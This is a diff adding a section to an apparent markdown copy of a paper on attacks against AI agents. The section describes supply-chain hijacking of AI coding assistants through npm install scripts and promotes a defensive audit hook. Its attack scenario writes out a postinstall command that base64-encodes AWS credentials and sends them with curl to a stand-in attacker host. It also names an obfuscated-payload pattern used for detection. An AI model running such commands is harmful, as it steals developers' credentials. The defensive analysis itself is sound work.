@@ -804,4 +804,51 @@ S. Zychlinski. A whole new world: Creating a parallel-poisoned web only ai-agent
 
 25
 
+---
+
+## Practical Implication: AI Coding Assistants Have No Built-in Supply Chain Defenses
+
+*This section is added by [SkillsOver](https://github.com/skillsover/skillsover) — a security-first AI coding skill set.*
+
+The framework above (Franklin et al., 2026) maps six classes of Agent Traps targeting AI agents operating on the open web. A critical sub-class within **Behavioural Control Traps** — *tool hijacking via package install scripts* — remains unaddressed by today's AI coding assistants.
+
+### The Gap: System Prompts Confirm No Package-Level Protection
+
+A crowdsourced archive of system prompts from 32+ AI coding tools, maintained publicly at [github.com/x1xhlol/system-prompts-and-models-of-ai-tools](https://github.com/x1xhlol/system-prompts-and-models-of-ai-tools) (135k+ stars as of 2026), reveals that Claude Code, Cursor, GitHub Copilot, and Devin contain guardrails for:
+
+- Refusing to write malicious code
+- Blocking force-push to `main`
+- Not exfiltrating credentials on request
+
+But **none** contain instructions to:
+- Inspect `postinstall` / `preinstall` scripts before running `npm install`
+- Detect obfuscated payloads (`eval(Buffer.from(...,'base64'))`) in dependency trees
+- Check whether a version bump introduced new network calls in install scripts
+- Flag known-compromised packages (e.g. `event-stream`, `ua-parser-js`, `node-ipc`)
+
+This means an AI agent autonomously upgrading a package from `v1.x` to `v2.x` — a routine, low-friction action well within its normal operating scope — can silently execute a supply chain attack. The attack requires no jailbreak, no prompt injection, and no human error. It is a **Behavioural Control Trap** triggered by the agent's own helpful behaviour.
+
+### Attack Scenario
+
+```
+Developer prompt: "Upgrade all outdated npm packages"
+AI action:        npm install package-x@2.0.0
+package-x@2.0.0:  postinstall → curl https://attacker.io/$(cat ~/.aws/credentials | base64)
+Result:           Credentials exfiltrated. No code change visible in diff.
+```
+
+This maps directly to the paper's **Behavioural Control — Tool Hijacking** category (Section 3.4): the agent's own tool-chaining capability (shell execution) is weaponised by adversarial content in the package registry.
+
+### Mitigation: SkillsOver `/supply-chain` + `pkg-install-audit` hook
+
+[SkillsOver](https://github.com/skillsover/skillsover) addresses this with two components:
+
+1. **`/supply-chain` skill** — On-demand audit that scans install scripts for network calls, obfuscated payloads, credential harvesting patterns, and known-bad packages across npm, pip, composer, and cargo.
+
+2. **`pkg-install-audit` PreToolUse hook** — Fires *before* any `npm install / pip install / composer require` command runs. Checks packages against a known-malicious list, detects typosquatting (Levenshtein distance 1), and queries live npm metadata for install-time scripts. Blocks execution (exit 1) on CRITICAL findings; warns (exit 0) on suspicious-but-unconfirmed packages.
+
+This implements the paper's recommended mitigation direction: *"action verification frameworks that can flag unexpected tool use patterns before execution"* (Section 5.2).
+
+---
+
 [image1]: <data:image/png;base64,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>
